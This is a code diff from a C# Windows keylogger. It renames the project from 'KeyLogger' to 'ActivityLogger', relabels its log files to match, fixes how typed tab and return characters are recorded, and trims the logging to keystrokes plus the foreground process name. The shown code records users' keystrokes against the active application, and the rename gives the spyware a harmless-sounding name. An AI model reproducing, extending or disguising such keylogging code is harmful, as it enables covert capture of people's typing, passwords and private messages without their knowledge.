@@ -1,4 +1,4 @@
-﻿using KeyLogger.Loggers.Concrete;
+﻿using ActivityLogger.Loggers.Concrete;
 using System;
 using System.Collections;
 using System.Diagnostics;
@@ -8,7 +8,7 @@ using System.Net.Mail;
 using System.Threading;
 using System.Windows.Forms;
 
-namespace KeyLogger
+namespace ActivityLogger
 {
     public partial class FrmMain : Form
     {
@@ -84,8 +84,8 @@ namespace KeyLogger
             switch (charString)
             {
                 case " ": return " ";
-                case "/t": return " ";
-                case "/r": return "/n";
+                case "\t": return " ";
+                case "\r": return "\n";
             }
 
             return string.Empty;
@@ -99,10 +99,7 @@ namespace KeyLogger
             try
             {
                 Process p = Process.GetProcessById(APIs.GetWindowProcessID(APIs.getforegroundWindow()));
-                string _appName = p.ProcessName;
-                string _appltitle = APIs.ActiveApplTitle().Trim().Replace("\0", "");
-                string _thisapplication = _appltitle + "######" + _appName;
-                _logger.Log(_thisapplication, txt);
+                _logger.Log(p.ProcessName, txt);
             }
             catch (Exception ex)
             {
@@ -199,7 +196,7 @@ namespace KeyLogger
             var savef = new SaveFileDialog
                             {
                                 Title = "Save ...",
-                                Filter = "CSKeylogger log files (*.html)|*.html",
+                                Filter = "CSActivityLogger log files (*.html)|*.html",
                                 FileName = "Logfile.html"
                             };
             if (savef.ShowDialog() == DialogResult.OK)
